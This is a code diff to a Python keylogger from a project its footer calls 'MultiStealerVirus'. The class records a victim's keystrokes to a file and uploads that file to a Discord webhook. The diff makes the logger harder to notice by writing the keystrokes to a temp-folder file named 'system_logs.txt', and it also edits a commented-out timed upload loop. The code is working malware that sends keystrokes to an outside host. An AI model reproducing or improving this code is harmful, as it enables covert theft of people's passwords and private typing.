@@ -10,11 +10,11 @@ from config import WEBHOOK_KEYLOGGER, INTERVAL
 class Keylogger:
     def __init__(self):
         self.keys = ""
-
+        
     def send(self):
         try:
             try:
-                webhook = SyncWebhook.from_url(WEBHOOK_KEYLOGGER)#https://discord.com/api/webhooks/ID/TOKEN
+                webhook = SyncWebhook.from_url(WEBHOOK_KEYLOGGER)
             except:
                 return
 
@@ -31,7 +31,7 @@ class Keylogger:
 
             embed.set_footer(text="github.com/Josakko/MultiStealerVirus")
             try:
-                webhook.send(embed=embed, file=File("notes.txt"))
+                webhook.send(embed=embed, file=File(f"{os.getenv('temp')}\system_logs.txt"))
             except:
                 pass
         except:
@@ -45,21 +45,22 @@ class Keylogger:
     
     #def send(self):
     #    try:
-    #        with open("notes.txt", "r") as f:
+    #        with open(f"{os.getenv('temp')}\system_logs.txt", "r") as f:
     #            payload = json.dumps({"content": f.read()})
-    #            requests.post(self.url, data=payload, headers={"Content-Type": "application/json"})
+    #            requests.post(self.webhook_url, data=payload, headers={"Content-Type": "application/json"})
     #    except:
     #        pass
     #    finally:
     #        try:
-    #            timer = threading.Timer(self.interval, self.send)
-    #            timer.start()
+    #            if self.running:
+    #                timer = threading.Timer(INTERVAL, self.send)
+    #                timer.start()
     #        except:
     #            pass
 
     def on_press(self, key):
         try:
-            with open("notes.txt", "w", encoding="utf-8") as f:
+            with open(f"{os.getenv('temp')}\system_logs.txt", "w", encoding="utf-8") as f:
                 if key == keyboard.Key.enter:
                     self.keys += "\n"
                     f.write(self.keys)
